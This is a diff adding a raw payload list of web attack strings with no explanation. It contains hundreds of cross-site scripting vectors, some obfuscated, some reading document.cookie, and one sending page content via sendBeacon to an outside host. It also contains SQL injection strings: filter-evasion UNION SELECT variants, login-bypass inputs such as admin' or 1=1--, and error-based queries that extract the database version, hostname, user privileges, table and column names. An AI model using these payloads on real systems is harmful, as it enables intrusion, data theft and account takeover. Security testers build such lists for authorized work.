@@ -1,0 +1,602 @@
+<xss onafterscriptexecute=alert(1)><script>1</script>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xss id=x style="position:absolute;" onanimationcancel="print()"></xss>
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
+<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xss>
+<body onbeforeprint=console.log(1)>
+<xss onbeforescriptexecute=alert(1)><script>1</script>
+<body onbeforeunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<audio src/onerror=alert(1)>
+<a id=x tabindex=1 onfocus=alert(1)></a>
+<body onmessage=print()>
+<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>
+<xss onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></xss>
+<style>@keyframes x{}</style><xss style="animation-name:x" onwebkitanimationstart="alert(1)"></xss>
+<input onauxclick=alert(1)>
+<xss onclick="alert(1)" style=display:block>test</xss>
+<xss ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</xss>
+div+0 Union select 1,version(),3,4,5
++div+0
++div false
++Having+1=0+
+Having false
++and false+
+and null+
++AND+1=0+
++and+(1)=(0)+
++and+(1)!=(0)+
++and+2>3+
++/*!and*/+1=0
+or 5*5*1=25 div+0 Union Select 1,version(),3,4,5
+and point(29,9)
+and mod(9,4)
+and power(5,5)
+oRdEr By 1 asc
+oRdEr By 1 desc
+--
+--+-
+--+
+-- -
+' -- -
+)--
+)-- -
+')--+
+')-- -
+'))-- -
+%23
+%23%23
+%60
+%00
+;%00
+%90
+/*
+union(select+1)
+--'- : +--+ / : -- - : --+- : /*
+OrDeR By 1 asc
+OrdeR By 1 desc
+) order by 1-- -
+') order by 1-- -
+')order by 1%23%23
+%')order by 1%23%23
+Null' order by 100--+
+Null' order by 9999--+
+')group by 99-- -
+'group by 119449-- -
+'group/**/by/**/99%23%23
+union select ByPassing method
++union+distinct+select+
++union+distinctROW+select+
+/**//*!12345UNION SELECT*//**/
+/**//*!50000UNION SELECT*//**/
++/*!50000UnIoN*/ /*!50000SeLeCt aLl*/+
++/*!u%6eion*/+/*!se%6cect*/+
+/**/uniUNIONon/**/aALLll/**/selSELECTect/**/
+1%')and(0)union(select(1),version(),3,4,5,6)%23%23%23
+/*!50000%55nIoN*/+/*!50000%53eLeCt*/
+union /*!50000%53elect*/
+%55nion %53elect
++--+Union+--+Select+--+
++UnIoN/*&a=*/SeLeCT/*&a=*/
++--+Union+--+Select+--+
++UnIoN/*&a=*/SeLeCT/*&a=*/
+id=1+’UnI”On’+'SeL”ECT’
+id=1+'UnI'||'on'+SeLeCT'
+UnIoN SeLeCt CoNcAt(version())--
+uNiOn aLl sElEcT
+uUNIONnion all sSELECTelect
+/*!50000UNION/**_**/+/*!50000SELECT/**_**/*/
+/*!group_concat*/()
+grOUp_ConCat(/*!*/,0x3e,/*!*/)
+group_concat(,0x3c62723e)
+g%72oup_c%6Fncat%28%76%65rsion%28%29,%22~BlackRose%22%29
+CoNcAt()
+CONCAT(DISTINCT Version())
+concat(,0x3a,)
+concat()
+CoNcAt()
+/*!50000cOnCat*/(/*!Version()*/)
+/*!50000cOnCat*/
+/**//*!12345cOnCat*/(,0x3a,)
+concat_ws()
+concat(0x3a,,0x3c62723e)
+/*!concat_ws(0x3a,)*/
+concat_ws(0x3a3a3a,version()
+CONCAT_WS(CHAR(32,58,32),version(),)
+REVERSE(tacnoc)
+binary(version())
+uncompress(compress(version()))
+aes_decrypt(aes_encrypt(version(),1),1)
+1+and+1=0+union+select+1,2,3,4,5,6
++AND+1=0
+" or 1=1
+" or --
+/*!aND*/ 1 like 0
++/*!and*/+1=0
++and+2>3+
++and(1)=(0)
+and (1)!=(0)
++div+0
+Having+1=0
+concat(?”>,
+,@@version,?
+“>
+?
+injection
+concat(0x223e,@@version)
+concat(0x273e27,version(),0x3c212d2d)
+concat(0x223e3c62723e,version(),0x3c696d67207372633d22)
+concat(0x223e,@@version,0x3c696d67207372633d22)
+concat(0x223e,0x3c62723e3c62723e3c62723e,@@version,0x3c696d67207372633d22,0x3c62​723e)
+concat(0x223e3c62723e,@@version,0x3a,”BlackRose”,0x3c696d67207372633d22)
+concat(‘’,@@version,’’)
+concat(0x273c2f7469746c653e27,@@version,0x273c7469746c653e27)
+concat(0x273c2f7469746c653e27,version(),0x273c7469746c653e27)
++and substring(version(),1,1)=4
++and substring(version(),1,1)=5
++and substring(version(),1,1)=9
++and substring(version(),1,1)=10
+id=1 /*!50094aaaa*/ error
+id=1 /*!50095aaaa*/ no error
+id=1 /*!50096aaaa*/ error
+id=1 /*!40123 1=1*/–+- no error
+id=1 /*!40122rrrr*/ no error
+'"><script>alert(1)</script><h1>d</h1>
+<h1 onclick=\u0041\u006cert("_Y000!_")>Y00</h1>
+<a onclick=\u0041\u006cert("_Y000!_")>Y00</a>
+<p onclick=\u0041\u006cert("_Y000!_")>Y00</p>
+<marquee onclick=\u0041\u006cert("_Y000!_")>Y00</marquee>
+<p/onclick=%27new%20Function`al\ert\`\u0059\u0030\u0030\u0030\``%27>d
+<p/onclick=self[`aler`%2b`t`]`\u0059\u0030\u0030\u0030`>d
+%22%3E%3Csvg%20onload=self[%27\x61\x6c\x65\x72\x74%27](%27\x5f\x59\x30\x30\x30\x21\x5f\x0a%27)%3E_Y000!_
+<img/src=%27https://i.imgur.com/kkum7k2.jpg%27%20onmouseover=prompt("_Y000!_")
+<marquee loop=1 width=0 onfinish=pr\u006fmpt(document.cookie)>Y000</marquee>
+"onfocus="alert('Y000')"+autofocus="
+</script><!--><svg onload=[document.domain].find%26%2340;alert%26rpar;>
+"><svg/onload=alert`${'000'}¥000!.was.here$`>
+<svg/onload=eval("ale"+"rt")(`✓${alert`✓`}`)>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydGBZMDAwYDwvc2NyaXB0Pg=='></object>
+<img src="x" onerror="document.write('<iframe src=tu_phishing></iframe>')"/>
+<marquee loop=1 width=0 onfinish=\u0070\u0072\u006f\u006d\u0070\u0074(document.cookie)>Y000</marquee>
+(alert)(1)
+a=alert,a(1)
+[1].find(alert)
+top[“al”+”ert”](1)
+top[/al/.source+/ert/.source](1)
+al\u0065rt(1)
+top[‘al\145rt’](1)
+top[‘al\x65rt’](1)
+top[8680439..toString(30)](1)
+globalThis[/al/.source+/ert/.source]`1` 
+[alert][0].call(this,1)
+(1,2,3,4,5,6,7,8,alert)(1)
+top['al\x65rt'](1)
+window['a'+'l'+'e'+'r'+'t'].call(this,1)
+top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
+confirm()
+confirm``
+(confirm``)
+{confirm``}
+[confirm``]
+(((confirm)))``
+co\u006efirm()
+new class extends confirm``{}
+[8].find(confirm)
+[8].map(confirm)
+[8].some(confirm)
+[8].every(confirm)
+[8].filter(confirm)
+[8].findIndex(confirm)
+self[`aler`%2b`t`]`1`
+'new Function`al\ert\`1\``'
+'new Function`pro\mpt\`1\``'
+alert(document['cookie']) 
+with(document)alert(cookie) 
+eval('ale'+'rt(1)')window['alert'](0)
+parent['alert'](1)
+self['alert'](2)
+this['alert'](4)
+frames['alert'](5)
+content['alert'](6)
+[12].forEach(alert);
+setTimeout('ale'+'rt(2)');
+setInterval('ale'+'rt(10)');
+Set.constructor('ale'+'rt(13)')();
+Set.constructor`al\x65rt\x2814\x29```;
+alert.call(null, document.domain);
+[document.domain].forEach(alert);
+alert.apply(null, [document.domain]);
+alert.bind()(document.domain);
+alert(this['document']['domain']);
+(new Map()).set(1, document.domain).forEach(alert);
+[class extends[alert````]{}]
+```${``[class extends[alert``]{}]}```
+[class extends[alert````]{}]
+throw new class extends Function{}('alert(1)')``
+x=new class extends Function{}('alert(1)'); x=new x;
+alert?.()
+confirm?.()
+prompt?.()
+`(alert())`
+<IMG SRC=x onload="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onafterprint="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onbeforeprint="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onbeforeunload="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onerror="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onhashchange="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onload="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmessage="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x ononline="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onoffline="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onpagehide="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onpageshow="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onpopstate="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onresize="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onstorage="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onunload="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onblur="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onchange="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x oncontextmenu="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x oninput="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x oninvalid="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onreset="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onsearch="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onselect="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onsubmit="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onkeydown="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onkeypress="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onkeyup="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onclick="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondblclick="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmousedown="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmousemove="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmouseout="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmouseover="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmouseup="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmousewheel="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onwheel="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondrag="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondragend="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondragenter="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondragleave="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondragover="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondragstart="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondrop="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onscroll="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x oncopy="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x oncut="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onpaste="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onabort="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x oncanplay="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x oncanplaythrough="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x oncuechange="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondurationchange="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onemptied="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onended="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onerror="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onloadeddata="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onloadedmetadata="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onloadstart="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onpause="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onplay="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onplaying="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onprogress="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onratechange="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onseeked="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onseeking="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onstalled="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onsuspend="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x ontimeupdate="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onvolumechange="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onwaiting="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onshow="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x ontoggle="alert(String.fromCharCode(88,83,83))">
+<script%20~~~>\u0061\u006C\u0065\u0072\u0074``</script%20~~~>
+<\x3Cscript>javascript:alert(1)</script>
+'`"><\x00script>javascript:alert(1)</script>
+<img src=1 href=1 onerror="javascript:alert(1)"></img>
+<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
+<video src=1 href=1 onerror="javascript:alert(1)"></video> 
+<body src=1 href=1 onerror="javascript:alert(1)"></body>
+<image src=1 href=1 onerror="javascript:alert(1)"></image>
+<object src=1 href=1 onerror="javascript:alert(1)"></object>
+<script src=1 href=1 onerror="javascript:alert(1)"></script> 
+<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>
+<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange> <iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad> 
+<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter> 
+<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>
+<frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll> 
+<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange>
+<html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>
+<body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)">
+</body onPropertyChange> <svg onLoad svg onLoad="javascript:javascript:alert(1)">
+</svg onLoad> <body onPageHide body onPageHide="javascript:javascript:alert(1)"></body onPageHide> 
+<body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver> 
+<body onUnload body onUnload="javascript:javascript:alert(1)">
+'-'
+' '
+'&'
+'^'
+'*'
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+"-"
+" "
+"&"
+"^"
+"*"
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+or true--
+" or true--
+' or true--
+") or true--
+') or true--
+' or ''-'
+" or ""-"
+" or true--
+' or true--
+admin' --
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin'or 1=1 or ''='
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1#
+admin' or 1=1/*
+admin") or ("1"="1
+admin") or ("1"="1"--
+admin") or ("1"="1"#
+admin") or ("1"="1"/*
+admin") or "1"="1
+admin") or "1"="1"--
+admin") or "1"="1"#
+admin") or "1"="1"/*
+ORDER BY 1-- 
+ORDER BY 2-- 
+ORDER BY 3-- 
+ORDER BY 4-- 
+ORDER BY 5-- 
+ORDER BY 6-- 
+ORDER BY 7-- 
+ORDER BY 8-- 
+ORDER BY 9-- 
+ORDER BY 10-- 
+ORDER BY 1# 
+ORDER BY 2# 
+ORDER BY 3# 
+ORDER BY 4# 
+ORDER BY 5# 
+ORDER BY 6# 
+ORDER BY 7# 
+ORDER BY 8# 
+ORDER BY 9# 
+ORDER BY 10# 
+UNION SELECT 1
+UNION SELECT 1,2
+UNION SELECT 1,2,3
+UNION SELECT 1,2,3,4
+UNION SELECT 1,2,3,4,5
+UNION SELECT 1,2,3,4,5,6
+UNION SELECT 1,2,3,4,5,6,7
+UNION ALL SELECT 1
+UNION ALL SELECT 1,2
+UNION ALL SELECT 1,2,3
+UNION ALL SELECT 1,2,3,4
+UNION ALL SELECT 1,2,3,4,5
+UNION ALL SELECT 1,2,3,4,5,6
+UNION ALL SELECT 1,2,3,4,5,6,7
+/*!UNION*/ /*!SELECT*/ 1
+/*!UNION*/ /*!SELECT*/ 1,2
+/*!UNION*/ /*!SELECT*/ 1,2,3
+/*!UNION*/ /*!SELECT*/ 1,2,3,4
+/*!UNION*/ /*!SELECT*/ 1,2,3,4,5
+/*!UNION*/ /*!SELECT*/ 1,2,3,4,5,6
+/*!UNION*/ /*!SELECT*/ 1,2,3,4,5,6,7
+/*!12345UNION*/ /*!12345SELECT*/ 1
+/*!12345UNION*/ /*!12345SELECT*/ 1,2
+/*!12345UNION*/ /*!12345SELECT*/ 1,2,3
+/*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4
+/*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4,5
+/*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4,5,6
+/*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4,5,6,7
+/*!%55nion*/%20/*!%53elect*/1
+/*!12345%55nion*/(/*!12345%53elect*/ 1)
+/*!12345%55nion*/ /*!12345%53elect*/ 1
+CoNcAt()
+concat() 
+CON%08CAT()
+CoNcAt()
+%0AcOnCat()
+/**//*!12345cOnCat*/
+/*!50000cOnCat*/(/*!*/)
+unhex(hex(concat(table_name)))
+unhex(hex(/*!12345concat*/(table_name)))
+unhex(hex(/*!50000concat*/(table_name)))
+/*!group_concat*/()
+gRoUp_cOnCAt()
+group_concat(/*!*/)
+group_concat(/*!12345table_name*/)
+group_concat(/*!50000table_name*/)
+/*!group_concat*/(/*!12345table_name*/)
+/*!group_concat*/(/*!50000table_name*/)
+/*!12345group_concat*/(/*!12345table_name*/)
+/*!50000group_concat*/(/*!50000table_name*/)
+/*!GrOuP_ConCaT*/()
+/*!12345GroUP_ConCat*/()
+/*!50000gRouP_cOnCaT*/()
+/*!50000Gr%6fuP_c%6fnCAT*/()
+unhex(hex(group_concat(table_name)))
+unhex(hex(/*!group_concat*/(/*!table_name*/)))
+unhex(hex(/*!12345group_concat*/(table_name)))
+unhex(hex(/*!12345group_concat*/(/*!table_name*/)))
+unhex(hex(/*!12345group_concat*/(/*!12345table_name*/)))
+unhex(hex(/*!50000group_concat*/(table_name)))
+unhex(hex(/*!50000group_concat*/(/*!table_name*/)))
+unhex(hex(/*!50000group_concat*/(/*!50000table_name*/)))
+convert(group_concat(table_name)+using+ascii)
+convert(group_concat(/*!table_name*/)+using+ascii)
+convert(group_concat(/*!12345table_name*/)+using+ascii)
+convert(group_concat(/*!50000table_name*/)+using+ascii)
+CONVERT(group_concat(table_name)+USING+latin1)
+/*!50000%55nIoN*/ /*!50000%53eLeCt*/
+%55nion(%53elect 1,2,3)-- -
++union+distinct+select+
++union+distinctROW+select+
+/**//*!12345UNION SELECT*//**/
+/**//*!50000UNION SELECT*//**/
+/**/UNION/**//*!50000SELECT*//**/
+/*!50000UniON SeLeCt*/
+union /*!50000%53elect*/
++ #?uNiOn + #?sEleCt
++ #?1q %0AuNiOn all#qa%0A#%0AsEleCt
+/*!%55NiOn*/ /*!%53eLEct*/
+/*!u%6eion*/ /*!se%6cect*/
++un/**/ion+se/**/lect
+uni%0bon+se%0blect
+%2f**%2funion%2f**%2fselect
+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
+REVERSE(noinu)+REVERSE(tceles)
+/*--*/union/*--*/select/*--*/
+union (/*!/**/ SeleCT */ 1,2,3)
+/*!union*/+/*!select*/
+union+/*!select*/
+/**/union/**/select/**/
+/**/uNIon/**/sEleCt/**/
++%2F**/+Union/*!select*/
+/**//*!union*//**//*!select*//**/
+/*!uNIOn*/ /*!SelECt*/
++union+distinct+select+
++union+distinctROW+select+
+uNiOn aLl sElEcT
+UNIunionON+SELselectECT
+/**/union/*!50000select*//**/
+0%a0union%a0select%09
+%0Aunion%0Aselect%0A
+%55nion/**/%53elect
+uni<on all="" sel="">/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
+%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/
+%0A%09UNION%0CSELECT%10NULL%
+/*!union*//*--*//*!all*//*--*//*!select*/
+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C
+/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
++UnIoN/*&a=*/SeLeCT/*&a=*/
+union+sel%0bect
++uni*on+sel*ect+
++#1q%0Aunion all#qa%0A#%0Aselect
+union(select (1),(2),(3),(4),(5))
+UNION(SELECT(column)FROM(table))
+%23xyz%0AUnIOn%23xyz%0ASeLecT+
+%23xyz%0A%55nIOn%23xyz%0A%53eLecT+
+union(select(1),2,3)
+union (select 1111,2222,3333)
+uNioN (/*!/**/ SeleCT */ 11)
+union (select 1111,2222,3333)
++#1q%0AuNiOn all#qa%0A#%0AsEleCt
+/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/
+%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/
++%23sexsexsex%0AUnIOn%23sexsexs ex%0ASeLecT+
++union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C
+/*!f****U%0d%0aunion*/+/*!f****U%0d%0aSelEct*/
++%23blobblobblob%0aUnIOn%23blobblobblob%0aSeLe cT+
+/*!blobblobblob%0d%0aunion*/+/*!blobblobblob%0d%0aSelEct*/
+/union\sselect/g
+/union\s+select/i
+/*!UnIoN*/SeLeCT
++UnIoN/*&a=*/SeLeCT/*&a=*/
++uni>on+sel>ect+
++(UnIoN)+(SelECT)+
++(UnI)(oN)+(SeL)(EcT)
++’UnI”On’+'SeL”ECT’
++uni on+sel ect+
++/*!UnIoN*/+/*!SeLeCt*/+
+/*!u%6eion*/ /*!se%6cect*/
+uni%20union%20/*!select*/%20
+union%23aa%0Aselect
+/**/union/*!50000select*/
+/^.*union.*$/ /^.*select.*$/
+/*union*/union/*select*/select+
+/*uni X on*/union/*sel X ect*/
++un/**/ion+sel/**/ect+
++UnIOn%0d%0aSeleCt%0d%0a
+UNION/*&test=1*/SELECT/*&pwn=2*/
+un?<ion sel="">+un/**/ion+se/**/lect+
++UNunionION+SEselectLECT+
++uni%0bon+se%0blect+
+%252f%252a*/union%252f%252a /select%252f%252a*/
+/%2A%2A/union/%2A%2A/select/%2A%2A/
+%2f**%2funion%2f**%2fselect%2f**%2f
+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
+/*!UnIoN*/SeLecT+
+/**8**/and/**8**/0/**8**//*!50000union*//**8**//*!50000select*//**8**/+ numero de columnas +--+
++/*!50000%55nIoN*/+/*!50000%53eLeCt*/+
+SELECT * FROM (SELECT count(*), CONCAT((SELECT database()), 0x23, FLOOR(RAND(0)*2)) AS x FROM information_schema.columns GROUP BY x) y --
++uNiOn+(/*!/**/SeleCT*/+1,22,333...)+--+
+%55%6e%49%6f%4e(/*!/**/%20SeleCT%20*/%2011,22,33,44,55,66,77,88,90,1010,1111,1212,1313,1414,1515,1616,1717,1818,1919....)
++/*✓*/UnIoN/*✓*/+/*✓*/AlL/*✓*/+(SeLeCt+1,2,3,%27soy%20vulnerable%27,5,6.....)+--+
++div+@a:=(current_user/**_**/())+UNION/**/DISTINCTROW+SELECT+1,2,@a,4+--+
+%75nion/**)!*/sele%63%74/**)!*/+1,2,3....
+/*!50000%75%6e%69on*/ %73%65%6cect 1,2,3,4,5--
++union(select+1,2,3,4,concat(column_name),6,...+from+information_schema.columns+where+table_name=%22columna%22+limit+1,1)+--+
++union(select+1,2,3,database(),concat(hash,0x3a,hash),6..+from(columna))+--+
+/*!12345UNION*/(/*!12345SELECT*/ 1)
+/*!12345UNION*/(/*!12345SELECT*/ 1,2)
+/*!12345UNION*/(/*!12345SELECT*/ 1,2,3)
+/*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4)
+/*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4,5)
+/*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4,5,6)
+/*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4,5,6,7)
+UNION(SELECT 1)
+UNION(SELECT 1,2)
+UNION(SELECT 1,2,3)
+UNION(SELECT 1,2,3,4)
+UNION(SELECT 1,2,3,4,5)
+UNION(SELECT 1,2,3,4,5,6)
+UNION(SELECT 1,2,3,4,5,6,7)
+UNION ALL(SELECT 1)
+UNION ALL(SELECT 1,2)
+UNION ALL(SELECT 1,2,3)
+UNION ALL(SELECT 1,2,3,4)
+UNION ALL(SELECT 1,2,3,4,5)
+UNION ALL(SELECT 1,2,3,4,5,6)
+UNION ALL(SELECT 1,2,3,4,5,6,7) 
+AND 1 UNION SELECT 1
+AND 1 UNION SELECT 1,2
+AND 1 UNION SELECT 1,2,3
+AND 1 UNION SELECT 1,2,3,4
+AND 1 UNION SELECT 1,2,3,4,5
+AND 1 UNION SELECT 1,2,3,4,5,6
+AND 1 UNION SELECT 1,2,3,4,5,6,7
+-7 %23%0AAND 0--%0A /*!12345UNION*/ /*!12345ALL*/ (/*!12345SELECT*/ 1,sleep(5),'soy vulnerable',BENCHMARK(1000000,MD5('true')),5,6,7,8,9,10,11,12,13)
+/*!50000un0x696fn*/+/*!12345AlL*/(/*!50000se0x6c65ct*/+1)+--+
+/*!50000%75%6e%69on*/ %73%65%6cect 1,2,3,4...
+/*!12345UnioN*//**/(/*!12345seLECT*//**/1)+--
+/*!12345#qa%0A#%0AUnIOn*/(/*!12345#qa%0A#%0ASeleCt*//**/1)+--+
+/*!50000and*/ /*!50000extractvalue*/(0x0a,/*!50000concat(0x0a,(select JSON_OBJECT(1, current_user())))*/)
+%27+or%20.0union/**/distinctrow%23GearFourth%0aselect/**/distinctrow%20
+/*!50000COnCaT/**8**/*/(0x3c68313e5f59303030215f3c2f68313e,0x3c703e56657273696f6e3a203c2f703e,@@version,0x3c62723e,0x3c703e486f73746e616d653a203c2f703e,@@hostname,0x3c62723e,0x3c703e446174616261736573203a203c2f703e,(select%20grouP_ConCat(/*!50000schema_name/**8**/*/,0x3c62723e)+/*!50000fRom/**8**/*/+/*!50000iNfoRmAtiOn_sChEmA/**_**/.ScHeMaTa*/),0x3c62723e,0x3c703e5461626c6573203a203c2f703e,(select%20grouP_ConCat(/*!50000table_name/**8**/*/,0x3c62723e)+/*!50000fRom/**8**/*/+/*!50000iNfoRmAtiOn_sChEmA/**_**/.TabLes*/))
+concat(0x3c68313e5f59303030215f3c2f68313e,0x3c703e56657273696f6e3a203c2f703e,@@version,0x3c62723e,0x3c703e486f73746e616d653a203c2f703e,@@hostname,0x3c62723e,0x3c703e446174616261736573203a203c2f703e,(select%20grouP_ConCat(/*!50000schema_name/**8**/*/,0x3c62723e)+/*!50000fRom/**8**/*/+/*!50000iNfoRmAtiOn_sChEmA/**_**/.ScHeMaTa*/),(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x))
+concat(0x3c68313e5f59303030215f3c2f68313e,0x3c703e56657273696f6e3a203c2f703e,@@version,0x3c62723e,0x3c703e486f73746e616d653a203c2f703e,@@hostname,0x3c62723e,0x3c62723e,0x3c613e50726976696c6567696f733a203c2f613e,0x3c62723e,(SELECT+GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e)+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES),0x3c62723e,0x3c703e446174616261736573203a203c2f703e,(select grouP_ConCat(/*!50000schema_name/**8**/*/,0x3c62723e)+/*!50000fRom/**8**/*/+/*!50000iNfoRmAtiOn_sChEmA/**_**/.ScHeMaTa*/),0x3c62723e,0x3c613e5461626c61733a203c2f613e,0x3c62723e,(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x))
++/*!12120%55%6e%49%6f%4e*/+(%53%65%4c%65%43%74+111,222,333,database(),555,...)+--+
++and extractvalue(0x0a,concat(0x0a,(select version())))
++and updatexml(null,concat(0x0a,(select version())),null)
++and extractvalue(0x0a,concat(0x0a,(select database())))
++and updatexml(null,concat(0x0a,(select database())),null)
++and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))
++and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),null)
++and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name=0x6e6f6d627265 limit 0,1)))
++and updatexml(null,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name=0x6e6f6d627265 limit 0,1)),null)
++and extractvalue(0x0a,concat(0x0a,(select concat(columna) from tabla limit 0,1)))
++and updatexml(null,concat(0x0a,(select concat(columna) from tabla limit 0,1)),null)
+uNion%20sElECt%20%2F*%21%20dAtaBaSE()%20*%2F%2b--%2b
